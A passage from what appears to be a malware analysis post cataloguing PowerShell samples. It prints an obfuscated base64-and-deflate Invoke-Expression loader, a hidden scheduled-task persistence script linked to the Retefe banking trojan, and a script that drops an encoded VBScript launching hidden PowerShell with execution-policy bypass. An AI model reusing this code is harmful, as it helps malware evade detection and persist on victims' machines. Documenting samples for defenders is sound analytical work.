			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c988710163068-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c988710163068-1"><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-i">Expression</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">IO</span><span class="crayon-sy">.</span><span class="crayon-e">StreamReader</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">IO</span><span class="crayon-sy">.</span><span class="crayon-v">Compression</span><span class="crayon-sy">.</span><span class="crayon-e">DeflateStream</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">IO</span><span class="crayon-sy">.</span><span class="crayon-e">MemoryStream</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-s">'rVZtb5tIEP4eKf9+nJvw=='</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">IO</span><span class="crayon-sy">.</span><span class="crayon-v">Compression</span><span class="crayon-sy">.</span><span class="crayon-v">CompressionMode</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Decompress</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">ReadToEnd</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><strong>Persistence</strong></p>
<p>PowerShell code identified with the primary intention of establishing persistence on the host.</p>
<p><strong>Scheduled Task COM (11 Samples – 0.27% Coverage)</strong></p>
<p>This variant seeks to create a persistence mechanism by creating a Scheduled Task that runs the malicious binary. The PE file this sample comes from drops a “minecraft.exe” and then launches this PowerShell command below - most likely, as it’s easier to pass this type of functionality off to PowerShell instead of trying to write the code into the original dropper.</p>
<p>The technique was seen primarily is samples associated to the <a href="http://blog.paloaltonetworks.com/2015/08/retefe-banking-trojan-targets-sweden-switzerland-and-japan/">Retefe banking trojan</a>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c98a724931132" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$TaskName = "Microsoft Windows Driver Update"
$TaskDescr = "Microsoft Windows Driver Update Services"
$TaskCommand = "C:\ProgramData\WindowsUpgrade\minecraft.exe"
$TaskScript = ""
$TaskArg = ""
$TaskStartTime = [datetime]::Now.AddMinutes(1)
$service = new-object -ComObject("Schedule.Service")
$service.Connect()
$rootFolder = $service.GetFolder("\")
$TaskDefinition = $service.NewTask(0)
$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.RestartCount = "5"
$TaskDefinition.Settings.StartWhenAvailable = $true
$TaskDefinition.Settings.StopIfGoingOnBatteries = $false
$TaskDefinition.Settings.RestartInterval = "PT5M"
$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(8)
$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
$trigger.Enabled = $true
$trigger.Repetition.Interval = "PT5M"
$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
$Action = $TaskDefinition.Actions.Create(0)
$action.Path = "$TaskCommand"
$action.Arguments = "$TaskArg"
$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
SCHTASKS /run /TN $TaskName</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c98a724931132-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98a724931132-28">28</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-1"><span class="crayon-sy">$</span><span class="crayon-v">TaskName</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft Windows Driver Update"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-2"><span class="crayon-sy">$</span><span class="crayon-v">TaskDescr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft Windows Driver Update Services"</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-3"><span class="crayon-sy">$</span><span class="crayon-v">TaskCommand</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"C:\ProgramData\WindowsUpgrade\minecraft.exe"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-4"><span class="crayon-sy">$</span><span class="crayon-v">TaskScript</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-5"><span class="crayon-sy">$</span><span class="crayon-v">TaskArg</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-6"><span class="crayon-sy">$</span><span class="crayon-v">TaskStartTime</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">datetime</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Now</span><span class="crayon-sy">.</span><span class="crayon-e">AddMinutes</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-7"><span class="crayon-sy">$</span><span class="crayon-v">service</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-o">-</span><span class="crayon-t">object</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">ComObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Schedule.Service"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-8"><span class="crayon-sy">$</span><span class="crayon-v">service</span><span class="crayon-sy">.</span><span class="crayon-e">Connect</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-9"><span class="crayon-sy">$</span><span class="crayon-v">rootFolder</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">service</span><span class="crayon-sy">.</span><span class="crayon-e">GetFolder</span><span class="crayon-sy">(</span><span class="crayon-s">"\")</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-10"><span class="crayon-s">$TaskDefinition = $service.NewTask(0)</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-11"><span class="crayon-s">$TaskDefinition.RegistrationInfo.Description = "</span><span class="crayon-sy">$</span><span class="crayon-i">TaskDescr</span><span class="crayon-s">"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-12"><span class="crayon-s">$TaskDefinition.Settings.Enabled = $true</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-13"><span class="crayon-s">$TaskDefinition.Settings.Hidden = $true</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-14"><span class="crayon-s">$TaskDefinition.Settings.RestartCount = "</span><span class="crayon-cn">5</span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-15"><span class="crayon-s">$TaskDefinition.Settings.StartWhenAvailable = $true</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-16"><span class="crayon-s">$TaskDefinition.Settings.StopIfGoingOnBatteries = $false</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-17"><span class="crayon-s">$TaskDefinition.Settings.RestartInterval = "</span><span class="crayon-i">PT5M</span><span class="crayon-s">"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-18"><span class="crayon-s">$triggers = $TaskDefinition.Triggers</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-19"><span class="crayon-s">$trigger = $triggers.Create(8)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-20"><span class="crayon-s">$trigger.StartBoundary = $TaskStartTime.ToString("</span><span class="crayon-v">yyyy</span><span class="crayon-o">-</span><span class="crayon-v">MM</span><span class="crayon-o">-</span><span class="crayon-i">dd</span><span class="crayon-s">'T'</span><span class="crayon-v">HH</span><span class="crayon-o">:</span><span class="crayon-v">mm</span><span class="crayon-o">:</span><span class="crayon-i">ss</span><span class="crayon-s">")</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-21"><span class="crayon-s">$trigger.Enabled = $true</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-22"><span class="crayon-s">$trigger.Repetition.Interval = "</span><span class="crayon-i">PT5M</span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-23"><span class="crayon-s">$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-24"><span class="crayon-s">$Action = $TaskDefinition.Actions.Create(0)</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-25"><span class="crayon-s">$action.Path = "</span><span class="crayon-sy">$</span><span class="crayon-i">TaskCommand</span><span class="crayon-s">"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-26"><span class="crayon-s">$action.Arguments = "</span><span class="crayon-sy">$</span><span class="crayon-i">TaskArg</span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-60a9b96a2c98a724931132-27"><span class="crayon-s">$rootFolder.RegisterTaskDefinition("</span><span class="crayon-sy">$</span><span class="crayon-i">TaskName</span><span class="crayon-s">",$TaskDefinition,6,"</span><span class="crayon-i">System</span>"<span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-cn">5</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98a724931132-28"><span class="crayon-v">SCHTASKS</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">run</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">TaskName</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->
<p><strong>VB Task (10 Samples – 0.24% Coverage)</strong></p>
<p>This grouping of PowerShell code originally comes from a PE that executes PowerShell with the EncodedCommand, which then creates a VBScript that is installed as a Scheduled Task. The VBSript simply launches another PowerShell script once it runs to achieve this.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c98d038102979" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$path= "$env:userprofile\appdata\local\microsoft\Windows"

if(-not(Test-Path -Path($path)))
{mkdir $path}

$fileout="$path\L69742.vbs";

$encstrvbs="c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K";

$bytevbs=[System.Convert]::FromBase64String($encstrvbs);

$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);

$strvbs = $strvbs.replace('#dpath#',$path);

set-content $fileout $strvbs;

$tmpfile="$env:TEMP\U1848931.TMP";

$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();

$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace('#id#',$id);

set-content "$path\mc.ps1" $pscode

$taskstr="schtasks /create /F /sc minute /mo 2 /tn ""GoogleServiceUpdate"" /tr ""\""$fileout""\""   ";

iex 'cmd /c $taskstr';
{{CODE}}

The base64 decoded VBScript –

{{CODE}}
set wss = CreateObject("WScript.Shell")
str = "power" &amp;amp; "sh" &amp;amp; "ell" &amp;amp; ".e" &amp;amp; "xe -NoP -sta -NonI -e" &amp;amp; "xe" &amp;amp; "c byp" &amp;amp; "as" &amp;amp; "s -fi" &amp;amp; "le "
path = "#dpath#"
str = str + path + "\mc.ps1"
wss.Run str, 0</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-28">28</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-30">30</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-32">32</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-34">34</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-36">36</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-38">38</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-40">40</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-42">42</div><div class="crayon-num" data-line="crayon-60a9b96a2c98d038102979-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98d038102979-44">44</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-1"><span class="crayon-sy">$</span><span class="crayon-v">path</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"$env:userprofile\appdata\local\microsoft\Windows"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-2">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-3"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">-</span><span class="crayon-st">not</span><span class="crayon-sy">(</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-v">Path</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Path</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">path</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-4"><span class="crayon-sy">{</span><span class="crayon-i">mkdir</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">path</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-6"><span class="crayon-sy">$</span><span class="crayon-v">fileout</span><span class="crayon-o">=</span><span class="crayon-s">"$path\L69742.vbs"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-8"><span class="crayon-sy">$</span><span class="crayon-v">encstrvbs</span><span class="crayon-o">=</span><span class="crayon-s">"c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-10"><span class="crayon-sy">$</span><span class="crayon-v">bytevbs</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">encstrvbs</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-12"><span class="crayon-sy">$</span><span class="crayon-v">strvbs</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">ASCII</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">bytevbs</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-13">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-14"><span class="crayon-sy">$</span><span class="crayon-v">strvbs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">strvbs</span><span class="crayon-sy">.</span><span class="crayon-e">replace</span><span class="crayon-sy">(</span><span class="crayon-s">'#dpath#'</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">path</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-15">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-16"><span class="crayon-v">set</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">fileout</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">strvbs</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-17">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-18"><span class="crayon-sy">$</span><span class="crayon-v">tmpfile</span><span class="crayon-o">=</span><span class="crayon-s">"$env:TEMP\U1848931.TMP"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-19">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-20"><span class="crayon-sy">$</span><span class="crayon-v">pscode_b64</span><span 